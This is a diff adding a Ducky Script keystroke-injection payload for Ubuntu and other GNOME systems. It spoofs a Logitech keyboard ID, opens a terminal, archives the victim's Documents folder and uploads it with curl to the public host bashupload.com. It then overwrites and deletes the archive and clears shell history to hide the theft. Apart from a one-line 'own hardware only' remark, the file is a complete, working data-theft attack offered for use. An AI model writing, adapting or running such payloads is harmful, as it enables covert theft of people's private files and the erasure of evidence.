@@ -1,0 +1,22 @@
+REM Platform: Ubuntu (and most other GNOME distros)
+REM Description: Exfiltrate data via curl
+
+REM Use on your own hardware only.
+REM Written by Aranym
+
+ID 046D:C339
+CTRL-ALT T
+DELAY 750
+
+REM Set directory to compress, server to send tarball to and tarball name.
+
+STRING SRV="bashupload.com"; DIR="$HOME/Documents"; NM="report.tar.gz"
+ENTER
+
+REM Main payload.
+
+STRING cd $DIR && tar --exclude=$NM -zcf $NM ./* && curl $SRV -T $NM && dd if=/dev/urandom of=$NM bs=100M count=1 && rm $NM && history -c; exit
+ENTER
+STRING exit
+ENTER
+ESC
